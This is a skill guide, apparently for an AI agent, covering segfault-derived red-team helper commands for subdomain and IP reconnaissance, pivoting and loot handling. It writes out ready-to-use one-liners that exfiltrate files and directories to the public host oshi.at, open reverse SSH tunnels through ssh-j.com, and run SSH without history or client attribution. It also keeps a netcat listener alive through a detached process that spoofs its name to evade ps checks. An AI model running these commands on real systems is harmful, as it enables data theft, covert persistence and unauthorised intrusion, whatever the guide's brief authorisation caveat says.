---
name: segfault-cli
description: "Use the segfault-derived helper CLIs in /opt/segfault/bin (crt, asnl, resolv, rdns, io, io2, ptr, dns, find_subdomains, addfileextension, transfer, gssec, sshj, xssh, supervise) plus the PROXY/TOR/hl/hgrep/lsg shell functions. Use for one-liner enumeration, resolution, pivoting and loot transfer; Not for full scanners (use nmap, httpx, ffuf) or C2 (use sliver)."
---

# segfault-cli

These are the small helpers from hackerschoice/segfault's guest environment, ported to `/opt/segfault/bin` and stripped of everything that depended on the segfault.net infrastructure. Each file is a bash wrapper that sources `funcs.sh` (and, for IP helpers, `funcs_ip.sh`) and dispatches to a function of the same name. There is no argument parser: what each one accepts is what the function signature accepts.

Two groups. Local ones work offline or with a single API call; relay ones (`gssec`, `sshj`, `xssh`, `transfer`) put a third party in the middle of your traffic.

## When to use

| Need | Helper | Shape |
| --- | --- | --- |
| Certificate-transparency subdomain dump | `crt` | `crt example.com` |
| ASN, prefix, country for an IP | `asnl` | `asnl 203.0.113.10` |
| Forward-resolve a list | `resolv` | `resolv hosts.txt` or stdin |
| Reverse names for an IP | `rdns` | `rdns 203.0.113.10` |
| IP and domain intel | `io`, `io2` | `io 203.0.113.10` |
| Everything about an IP in one shot | `ptr` | `ptr 203.0.113.10` |
| Passive DNS answers | `dns` | `dns 203.0.113.10` (token) |
| Mine subdomains out of files | `find_subdomains` | `find_subdomains .example.com notes/` |
| Fix an extensionless loot file | `addfileextension` | `addfileextension dump` |
| Move a file out | `transfer` | `transfer loot.zip` |
| Deterministic GSocket secret | `gssec` | `gssec host1` |
| Quick reverse SSH tunnel | `sshj` | `sshj tid 10.0.0.5 22` |
| Interactive SSH without history | `xssh` | `xssh user@host` |
| Keep a listener alive | `supervise` | `supervise 'nc -lvnp 4444'` |

## Prerequisites

- PATH: `/etc/profile.d/10-redteam.sh` appends `/opt/segfault/bin`, `/opt/tools` and `/opt/node/bin`; it is sourced from zsh's `zshenv`, so bash subprocesses and non-login shells may lack all three.
- Dependencies present: `curl`, `jq`, `nc` (netcat), `rg` (ripgrep), `getent`, `batcat`, `file`.
- `anew` lives at `/opt/tools/anew`; `crt` needs it on PATH.
- `gssec` needs `GS_SEED` exported, and `gs-netcat` to actually connect (not installed here).
- Optional tokens: `~/.config/ipinfo/api_key` (for `io`, `io2`), `~/.config/dnsdb/api_key` (for `dns`). Missing tokens produce a warning on stderr, not a failure.
- Shell functions live in `/opt/segfault/shellrc.sh`, sourced at line 160 of `~/.zshrc`.

## Core invocations

```sh
# 1. certificate transparency: every common_name and SAN, deduped, wildcards stripped
crt example.com > names.txt          # requires anew; queries crt.sh

# 2. ASN lookup, one IP or a whole list on stdin (team-cymru whois:43)
asnl 203.0.113.10
printf '203.0.113.10\n198.51.100.7\n' | asnl

# 3. forward resolution from a file or stdin: "ip<TAB>name", A records only
resolv hosts.txt > resolved.tsv
cat hosts.txt | resolv

# 4. reverse and neighbouring names from ip.thc.org
rdns 203.0.113.10

# 5. IP intel as JSON, then domains seen on that IP
io 203.0.113.10
io2 203.0.113.10

# 6. one-shot pivot on an interesting address: io, io2, shodan, rdns, dns, host
ptr 203.0.113.10

# 7. passive DNS (needs ~/.config/dnsdb/api_key, otherwise silent)
dns 203.0.113.10

# 8. pull subdomains out of saved HTML, JS and notes; leading dot forces a boundary
find_subdomains .example.com /tmp/loot/
cat page.html | find_subdomains .example.com

# 9. rename an unknown file by its magic (uses file(1), falls back to a text/MIME guess)
addfileextension /tmp/loot/blob          # -> /tmp/loot/blob.exe

# 10. exfiltrate: file, directory (tar.gz) or stdin, uploaded to oshi.at
transfer /tmp/loot/           # returns a public https URL
printf 'data' | transfer out.txt

# 11. deterministic GSocket secret from a master seed, so both sides derive the same ID
export GS_SEED='change-me-per-engagement'
gssec host1

# 12. reverse tunnel through ssh-j.com, then connect from anywhere
sshj mytunnel 10.0.0.5 22
# prints: ssh -J mytunnel@ssh-j.com root@mytunnel

# 13. interactive SSH with a raw pty, no history files, spoofed argv
xssh user@10.0.0.5

# 14. respawn a command every 10 seconds, detached and silent
supervise 'nc -lvnp 4444'

# 15. shell helpers (zsh, from shellrc.sh)
PROXY                            # 127.0.0.1:9050 (falls back when share/proxies.txt is absent)
PROXY 'socks5h://%h:%p'          # socks5h://127.0.0.1:9050
TOR                              # 127.0.0.1:9050
curl -x socks5h://$(TOR) http://127.0.0.1:8080/
hl json < /tmp/loot/response.json   # batcat with a language, reads stdin
lsg 'loot'                       # ls -Alh | grep -i
hgrep sshj                       # search shell history
```

## Flags that matter

These take positional arguments, not flags. The table is the argument contract.

| Helper | Arguments | Behaviour |
| --- | --- | --- |
| `crt` | `<domain>` (exactly one) | prints lowercased names, strips `*.` |
| `asnl` | `[ip]` or stdin | `begin/verbose/end` protocol to `whois.cymru.com:43` |
| `resolv` | `[names...]` or stdin | `getent ahostsv4`, STREAM lines only |
| `rdns` | `<ip> [filter]` | `ip.thc.org/<ip>?limit=20&f=<filter>` |
| `io` | `<ip>` | `ipinfo.io/<ip>`, jq-pretty |
| `io2` | `<ip>` | `host.io/api/domains/ip/<ip>` |
| `ptr` | `<ip>` | chains six lookups; needs `shodan` for one of them |
| `dns` | `<ip>` | dnsdb rdata, 20 rows, exits silently without a token |
| `find_subdomains` | `<apex> [paths...]` | regex over files or stdin; leading dot anchors |
| `addfileextension` | `<file>` | renames in place, no-op if the suffix already matches |
| `transfer` | `<file\|dir> [remote-name]` | stdin mode uploads to the given name |
| `gssec` | `<label>` | sha512(GS_SEED+label) -> base64 -> first 22 alphanumerics |
| `sshj` | `[id] [host] [port]` | random 12-char ID when omitted; `-R id:22:host:port` |
| `xssh` | `<ssh args>` | sets `stty raw -echo opost` before connecting |
| `supervise` | `<command...>` | `while :; do cmd; sleep 10; done`, argv `[supervise]` |
| `hl` | `[language]` | reads stdin; `hl` alone is plain `batcat` |
| `PROXY` | `[printf-format]` | random line from `share/proxies.txt`, else `127.0.0.1:9050` |

## Workflow

1. **Name collection.** `crt example.com` plus `find_subdomains .example.com loot/` for anything already saved from JS or HTML.
2. **Resolution.** `resolv names.txt` gives `ip<TAB>name`; dedupe on the first column to collapse shared hosting.
3. **Address intel.** `ptr` on each unique IP; it already runs `io`, `io2`, `rdns`, `dns` and `host`, so do not call them again one by one.
4. **Triage loot.** `addfileextension` every extensionless blob before `file`/`binwalk`/`7z l`.
5. **Pivot last.** `gssec`/`sshj`/`xssh` only after you accept a third party in the path; prefer the tunnel you already control.
6. **Record provenance.** These helpers contact public services from your IP. Note which helper produced which file.

## OPSEC and telemetry

- `crt` queries crt.sh; `asnl` queries team-cymru on port 43; `io`/`io2`/`rdns`/`dns` hit ipinfo.io, host.io, ip.thc.org and dnsdb. Every one logs your source address against the target you asked about.
- `transfer` uploads to `https://oshi.at` and returns a public URL. Treat every transfer as disclosure to a third party; use a tunnel or your own endpoint for real loot.
- `gssec` derives secrets from `GS_SEED` and publishes nothing, but the resulting ID is only as secret as the seed. `sshj` relays through ssh-j.com, `xssh` uses ssh-j.com-style jump hosts if you pass them, and both expose the session metadata to that relay.
- `xssh` unsets `SSH_CLIENT`/`SSH_CONNECTION` and disables history, which also means the remote side loses attribution you might want later.
- `supervise` detaches with a spoofed argv (`[supervise] <cmd>`), so it survives your shell and hides from naive `ps` greps. That is persistence: get authorization.
- `PROXY`/`TOR` default to `127.0.0.1:9050`; they print an address, they do not start a listener.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `crt` prints nothing, `anew: command not found` | `/opt/tools` not on PATH | `export PATH=/opt/tools:$PATH` or run under a login shell |
| `find_subdomains example.com` returns `notexample.com` | apex matched as a substring | pass `.example.com` to require the dot boundary |
| `find_subdomains .example.com` starts walking everything | only an apex was given and stdin is a TTY, so it defaults to `.` | pass a path, or pipe the text in |
| `resolv` prints nothing for some names | `getent` returns no A record (CNAME-only, NXDOMAIN) | expected; check with `dig +short A` |
| `dns` exits silently | no `~/.config/dnsdb/api_key` | create the key file, or skip it (`ptr` continues without it) |
| `io` returns an error object | ipinfo rate limit without a token | add `~/.config/ipinfo/api_key` |
| `transfer` prints usage | zero arguments | `transfer <file>`; stdin mode needs the remote name |
| `gssec` prints the ERROR line | `GS_SEED` unset | `export GS_SEED=...`; the string must match on both ends |
| `sshj` dies immediately | port 22 outbound blocked, or the ID is taken | try another ID; check `ssh -v` |
| Terminal is unusable after `xssh` closes | `stty raw` ran, ssh failed before restore | `stty sane` (blind-typed, then Enter) |
| `supervise` seems to do nothing | output is `/dev/null`, process detached | `ps -ef | grep '[supervise]'`, then `pkill -f '[supervise]'` |
| `hl file.json` says unknown syntax | `hl` takes a language, reads stdin | `hl json < file.json` |

## Verification

```sh
ls /opt/segfault/bin | wc -l                 # 19
file /opt/segfault/bin/crt                   # Bourne-Again shell script
addfileextension /tmp/t.bin                  # renames to /tmp/t.bin.txt
printf 'x.example.com\n' | find_subdomains .example.com   # x.example.com
transfer                                     # Usage: transfer <file/directory> ...
gssec                                        # ERROR: Please first set: GS_SEED=...
zsh -ic 'PROXY; TOR; type pp'                # 127.0.0.1:9050 twice, pp alias
```

Network-dependent helpers (`crt`, `asnl`, `resolv` against real names, `io`, `io2`, `rdns`, `dns`, `ptr`, `transfer`, `sshj`) were verified by reading their sources on this host, not by sending traffic.

## Related skills

- [proxychains](../proxychains/SKILL.md) for chaining the SOCKS endpoints these helpers print
- [wordlists](../wordlists/SKILL.md) for the lists that feed `resolv` and `find_subdomains`
- [redteam-toolchain](../redteam-toolchain/SKILL.md) for where these files came from and what PATH they need
- [netexec](../netexec/SKILL.md) for the credential-side equivalent of `ptr`
- [toolchain-router](../toolchain-router/SKILL.md) to pick a different recon path